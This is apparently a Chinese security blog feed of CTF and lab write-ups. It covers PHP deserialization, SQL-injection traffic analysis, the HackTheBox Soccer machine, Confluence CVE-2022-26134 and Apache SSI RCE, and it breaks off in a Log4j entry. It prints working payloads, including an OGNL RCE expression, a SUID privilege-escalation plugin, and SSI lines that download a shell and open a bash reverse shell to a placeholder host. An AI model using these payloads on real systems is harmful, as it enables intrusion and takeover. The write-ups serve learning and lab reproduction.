class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Step 1.</li></ul><p>写入到 SESSION 中</p><pre class="line-numbers language-none"><code class="language-none">[GET]/?baby=session.serialize_handler&amp;d0g3=php_serialize[POST]sess=%7CO%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22ssrf%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D[COOKIE]PHPSESSID=hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Step 2.</li></ul><p>触发反序列化</p><pre class="line-numbers language-none"><code class="language-none">[POST]pop=O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";N;s:1:"c";O:1:"A":3:{s:1:"a";s:11:"0e215962017";s:1:"b";O:1:"C":2:{s:1:"a";s:3:"nah";s:1:"c";N;}}}s:1:"b";N;s:1:"k";N;}[COOKIE]PHPSESSID=hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Step 3.</li></ul><p>读取回显结果</p><pre class="line-numbers language-none"><code class="language-none">[COOKIE]PHPSESSID=hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020221127165120.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安洵杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鹤城杯 2021</title>
      <link href="/2023/01/21/catchtheflag/games/he-cheng-bei/he-cheng-bei-2021/"/>
      <url>/2023/01/21/catchtheflag/games/he-cheng-bei/he-cheng-bei-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="鹤城杯-2021"><a href="#鹤城杯-2021" class="headerlink" title="鹤城杯 2021"></a>鹤城杯 2021</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-流量分析"><a href="#1-流量分析" class="headerlink" title="1. 流量分析"></a>1. 流量分析</h3><p>#SQL注入流量分析</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题解解析</li></ul><p><img src="/../../../../pic/Pasted%20image%2020230214144227.png"></p><p>打开之后发现存在 sql 注入的流量</p><p>将 url 导出来</p><pre class="line-numbers language-none"><code class="language-none">tshark -r timu.pcapng -T fields -e http.request.uri | sed '/^\s*$/d' &gt; list.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用正则导出来 flag</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"bufio"</span><span class="token string">"fmt"</span><span class="token string">"io"</span><span class="token string">"log"</span><span class="token string">"os"</span><span class="token string">"regexp"</span><span class="token string">"strconv"</span><span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>srcfile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"list.txt"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">defer</span> srcfile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>srcfile<span class="token punctuation">)</span>result <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">==</span> io<span class="token punctuation">.</span>EOF <span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">}</span>r <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`om%20t\),(\w*),1\)\)=(\w*)--+`</span><span class="token punctuation">)</span><span class="token keyword">if</span> r<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token punctuation">{</span>submatch <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>result<span class="token punctuation">[</span>submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> submatch<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span><span class="token keyword">for</span> j<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> result <span class="token punctuation">{</span>index<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">if</span> i <span class="token operator">==</span> index <span class="token punctuation">{</span>atoi<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>atoi<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果</p><pre class="line-numbers language-none"><code class="language-none">flag{w1reshARK_ez_1sntit}~~~~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鹤城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑盾杯 2020</title>
      <link href="/2023/01/21/catchtheflag/games/hei-dun-bei/hei-dun-bei-2020/"/>
      <url>/2023/01/21/catchtheflag/games/hei-dun-bei/hei-dun-bei-2020/</url>
      
        <content type="html"><![CDATA[<h1 id="黑盾杯-2020"><a href="#黑盾杯-2020" class="headerlink" title="黑盾杯 2020"></a>黑盾杯 2020</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-Blue"><a href="#1-Blue" class="headerlink" title="1. Blue"></a>1. Blue</h3><p>#流量分析 #SQL注入流量分析 </p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>下载下来附件</p><p>为一张图片，使用 binwalk 分析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk Conan.JPG<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301160904.png"></p><p>其中藏着一个压缩文件，使用 foremost 提取出来</p><p>提取出来压缩包，存在伪加密，修改之后解压出来流量包</p><p><img src="/../../../../pic/Pasted%20image%2020230301161035.png"></p><p>存在一个 SQL 注入流量，将对应的参数提取出来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tshark <span class="token parameter variable">-r</span> blindsql.pcapng <span class="token parameter variable">-Y</span> <span class="token string">'http.request.method == "GET"'</span> <span class="token parameter variable">-T</span> fields <span class="token parameter variable">-e</span> http.request.uri.query <span class="token operator">&gt;</span> out.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写个脚本将 flag 提取出来</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"bufio"</span>      <span class="token string">"fmt"</span>      <span class="token string">"os"</span>      <span class="token string">"regexp"</span>      <span class="token string">"strconv"</span>      <span class="token string">"syscall"</span><span class="token punctuation">)</span>    <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     file<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"out.txt"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>     <span class="token keyword">defer</span> file<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       reader <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewReader</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>     flag <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>        line<span class="token punctuation">,</span> err <span class="token operator">:=</span> reader<span class="token punctuation">.</span><span class="token function">ReadString</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           <span class="token keyword">break</span>        <span class="token punctuation">}</span>        compile <span class="token operator">:=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`\(select%20flag%20from%20answer\),(\d+),1\)\)=(\d+)--\+`</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> compile<span class="token punctuation">.</span><span class="token function">MatchString</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token punctuation">{</span>           submatch <span class="token operator">:=</span> compile<span class="token punctuation">.</span><span class="token function">FindStringSubmatch</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>           flag<span class="token punctuation">[</span>submatch<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> submatch<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        atoi<span class="token punctuation">,</span> err <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>           <span class="token keyword">break</span>        <span class="token punctuation">}</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>atoi<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑盾杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB - Soccer</title>
      <link href="/2023/01/21/penetrationstest/ba-chang-xue-xi/hackthebox/htb-soccer/"/>
      <url>/2023/01/21/penetrationstest/ba-chang-xue-xi/hackthebox/htb-soccer/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-Soccer"><a href="#HTB-Soccer" class="headerlink" title="HTB - Soccer"></a>HTB - Soccer</h1><h2 id="1-Web-渗透"><a href="#1-Web-渗透" class="headerlink" title="1. Web 渗透"></a>1. Web 渗透</h2><p>访问靶机 IP 发现自动跳转到 soccer.htb，写入到 host 文件后再次访问即可</p><p><img src="/../../../../pic/Pasted%20image%2020230228211642.png"></p><p>没啥功能点给出来，扫描一下目录</p><pre class="line-numbers language-none"><code class="language-none">gobuster dir --url http://soccer.htb/ --wordlist SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt --threads 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230228212712.png"></p><p>存在个 tiny 目录</p><p><img src="/../../../../pic/Pasted%20image%2020230228214358.png"></p><p>使用 Tiny File Manager 管理</p><p>查看下官方文档</p><p><img src="/../../../../pic/Pasted%20image%2020230228214617.png"></p><p>存在两个默认用户，使用  admin / admin@123 登录</p><p>上传一个反弹 shell 文件到 uploads 目录下然后访问后获得 shell</p><p><img src="/../../../../pic/Pasted%20image%2020230301002046.png"></p><p>读取 hosts 文件发现还存在一个 soc-player.soccer.htb 域名</p><p><img src="/../../../../pic/Pasted%20image%2020230301002131.png"></p><p>还存在一个 player 用户</p><p>先将 soc-player.soccer.htb 绑定一下</p><p>访问后多出来了一个用户注册与登录功能</p><p>注册个测试用户登录</p><p>查看下源代码发现使用了 websocket 传输数据</p><p><img src="/../../../../pic/Pasted%20image%2020230301002308.png"></p><p>抓包测试一下</p><p><img src="/../../../../pic/Pasted%20image%2020230301002520.png"></p><p>发现存在数字型注入</p><p>根据<a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket | Rayhan0x01’s Blog</a>搭建个环境使用 sqlmap 跑一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> http://localhost:8081/?id<span class="token operator">=</span><span class="token number">1</span> --dump-all --exclude-sysdbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230228205736.png"></p><p>跑了一个半小时才跑出来</p><p>使用 <a href="mailto:player@player.htb">player@player.htb</a> / PlayerOftheMatch2022 登录后没发现有啥特殊的东西</p><p>由于前面探测是发现还存在一个 player 用户，使用该密码登录下 SSH</p><p><img src="/../../../../pic/Pasted%20image%2020230301002937.png"></p><p>在用户目录下找到 flag </p><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><img src="/../../../../pic/Pasted%20image%2020230301003501.png"></p><h2 id="2-系统提权"><a href="#2-系统提权" class="headerlink" title="2. 系统提权"></a>2. 系统提权</h2><p>查找下具有 SUID 权限的文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301003950.png"></p><p>这里存在一个 <a href="https://zh.m.wikipedia.org/zh-hans/Doas">doas</a> 文件</p><p>查找下配置文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> doas.conf <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230301004222.png"></p><p>player 用户可以使用 dstat 文件以 root 用户权限执行命令</p><p>通过查看dstat程序的官方文档，发现我们可以编写插件并执行，名称必须为 dstat_*.py，插件存放的目录为 /usr/local/share/dstat/</p><p>可以创建一个 dstat 文件向其中写入后门</p><pre class="line-numbers language-none"><code class="language-none">cd /usr/local/share/dstat/echo 'import os;os.system("chmod +s /bin/bash");' &gt; dstat_shell.pydoas /usr/bin/dstat --shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时 /bin/bash 也被赋予了 SUID 权限</p><pre class="line-numbers language-none"><code class="language-none">/bin/bash -p <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>-p 实际执行用户与权限组用户不同时</li></ul><p><img src="/../../../../pic/Pasted%20image%2020230301005331.png"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><img src="/../../../../pic/Pasted%20image%2020230301005423.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Confluence 远程代码执行漏洞</title>
      <link href="/2023/01/21/penetrationstest/lou-dong-fu-xian/confluence/confluence-yuan-cheng-dai-ma-zhi-lou-dong/"/>
      <url>/2023/01/21/penetrationstest/lou-dong-fu-xian/confluence/confluence-yuan-cheng-dai-ma-zhi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Confluence-远程代码执行漏洞"><a href="#Confluence-远程代码执行漏洞" class="headerlink" title="Confluence 远程代码执行漏洞"></a>Confluence 远程代码执行漏洞</h1><p>#CVE-2022-26134</p><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Confluence是一款专业的企业知识管理与协同软件，常用于企业wiki的构建，支持团队成员间开展信息共享、文档协作、集体讨论和信息推送等工作，具有较为便捷的编辑和站点管理特性。该软件由Atlassian公司负责开发和维护。</p><p>未经身份验证的攻击者利用该漏洞可在目标服务器执行任意代码。目前，漏洞细节信息尚未公开，厂商已发布漏洞缓解建议，暂未发布修复补丁。</p><p>漏洞编号：CVE-2022-26134</p><p>漏洞威胁等级：严重</p><h2 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a>二、影响版本</h2><pre><code>Atlassian Confluence Server and Data Center &lt;7.4.17Atlassian Confluence Server and Data Center &lt;7.13.7Atlassian Confluence Server and Data Center &lt;7.14.3Atlassian Confluence Server and Data Center &lt;7.15.2Atlassian Confluence Server and Data Center &lt;7.16.4Atlassian Confluence Server and Data Center &lt;7.17.4Atlassian Confluence Server and Data Center &lt;7.18.1</code></pre><h2 id="三、环境搭建"><a href="#三、环境搭建" class="headerlink" title="三、环境搭建"></a>三、环境搭建</h2><p>使用 vulhub 搭建</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">cd vulhub/confluence/CVE-2022-26134docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>根据 ReadMe 中的内容安装即可</p><h2 id="四、漏洞复现"><a href="#四、漏洞复现" class="headerlink" title="四、漏洞复现"></a>四、漏洞复现</h2><p>核心为OGNL表达式注入漏洞</p><p>构造的 payload 为</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">{</span><span class="token punctuation">(</span>#a<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.commons.io.IOUtils</span><span class="token annotation punctuation">@toString</span><span class="token punctuation">(</span><span class="token annotation punctuation">@java.lang.Runtime</span><span class="token annotation punctuation">@getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token annotation punctuation">@com.opensymphony.webwork.ServletActionContext</span><span class="token annotation punctuation">@getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"X-Cmd-Response"</span><span class="token punctuation">,</span>#a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>URL编码后发送</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%22utf-8%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Cmd-Response%22%2C%23a))%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../pic/Pasted%20image%2020220608184737.png"></p><p>成功执行 payload</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Confluence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache SSI 远程命令执行复现</title>
      <link href="/2023/01/21/penetrationstest/lou-dong-fu-xian/apache/ssi-yuan-cheng-ming-ling-zhi-xing/apache-ssi-yuan-cheng-ming-ling-zhi-xing-fu-xian/"/>
      <url>/2023/01/21/penetrationstest/lou-dong-fu-xian/apache/ssi-yuan-cheng-ming-ling-zhi-xing/apache-ssi-yuan-cheng-ming-ling-zhi-xing-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-SSI-远程命令执行复现"><a href="#Apache-SSI-远程命令执行复现" class="headerlink" title="Apache SSI 远程命令执行复现"></a>Apache SSI 远程命令执行复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>什么是 SSI ：<a href="https://blog.csdn.net/weixin_30399871/article/details/94779816">链接</a></p><p>简单来说就是可以向 HTML 中嵌入命令，在页面被访问时由服务器进行运算，动态生成内容。常见的后缀为 .stm、.shtm 和 .shtml</p><pre class="line-numbers language-ssi" data-language="ssi"><code class="language-ssi">命令格式：&lt;!--指令名称="指令参数"&gt;示例命令&lt;!--#include file="info.htm"--&gt;&lt;!--#exec cmd="whoami"--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SSI 漏洞挖掘：<a href="https://blog.csdn.net/qq_40657585/article/details/84260844">链接</a></p><p>可通过 XSS 漏洞测试是否存在 SSI 远程代码执行漏洞</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>Apache全版本（支持SSI与CGI）</p><h2 id="3-漏洞环境"><a href="#3-漏洞环境" class="headerlink" title="3. 漏洞环境"></a>3. 漏洞环境</h2><p>采用 vulhub 提供的环境进行复现</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /vulhub/httpd/ssi-rce<span class="token function">sudo</span> <span class="token function">docker-compose</span> build<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4. 漏洞复现"></a>4. 漏洞复现</h2><p>访问 <a href="http://192.168.80.131:8080/upload.php">http://192.168.80.131:8080/upload.php</a> 获得到上传点</p><p>构造一个 .shtml 内容为</p><pre class="line-numbers language-ssi" data-language="ssi"><code class="language-ssi">&lt;!--#exec cmd="whoami"--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传后访问链接即可执行命令</p><p><strong>上传 shell</strong></p><pre class="line-numbers language-ssi" data-language="ssi"><code class="language-ssi">&lt;!--#exec cmd="curl http://IP/shell.txt -o shell.txt | mv shell.txt shell.php"--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问 shell.php 即可获得shell</p><p><strong>构造一个反弹 shell</strong></p><pre class="line-numbers language-ssi" data-language="ssi"><code class="language-ssi">&lt;!--#exec cmd="bash -c 'exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1'"--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../../../pic/Pasted%20image%2020220720104928.png"></p><p>随后即可在服务器上获得 shell</p><h2 id="5-防御"><a href="#5-防御" class="headerlink" title="5. 防御"></a>5. 防御</h2><ul><li><p>关闭服务器SSI功能</p></li><li><p>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,",'</code>）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j 远程代码执行漏洞</title>
      <link href="/2023/01/21/penetrationstest/lou-dong-fu-xian/apache/log4j/log4j-ming-ling-zhu-ru-lou-dong/"/>
      <url>/2023/01/21/penetrationstest/lou-dong-fu-xian/apache/log4j/log4j-ming-ling-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Log4j-远程代码执行漏洞"><a href="#Log4j-远程代码执行漏洞" class="headerlink" title="Log4j 远程代码执行漏洞"></a>Log4j 远程代码执行漏洞</h1><p>#CVE-2021-44228</p><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>apache log4j通过定义每一条日志信息的级别能够更加细致地控制日志生成地过程，受影响地版本中纯在JNDI注入漏洞，导致日志在记录用户输入地数据时，触发了注入漏洞，该漏洞可导致远程代码执行，且利用条件低，影响范围广，小到网站，大到可联网的车都受影响，建议使用了相关版本的应用或者插件，尽快升级修补，做好相关方措施，避免造成不必要的损失</p><h2 id="2-影响范围"><a href="#2-影响范围" class="headerlink" title="2. 影响范围"></a>2. 影响范围</h2><ul><li>2.0 &lt;= Log4j - 2 &lt;= 2.14.1</li><li>Spring-boot-strater-log4j2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li></ul><h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3. 环境搭建"></a>3. 环境搭建</h2><p>利用 <a href="https://github.com/fengxuangit/log4j_vuln">https://github.com/fengxuangit/log4j_vuln</a> 进行 docker 搭建</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln<span class="token function">docker</span> run <span class="token parameter variable">-it</span> <span class="token parameter variable">-d</span> <span class="token parameter variable">-p</span> <span class="token number">8080</span>:8080 <span class="token parameter variable">--name</span> log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln <span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> log4j_vuln_container /bin/bash/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问 /webstudy/hello-fengxuan ，参数为 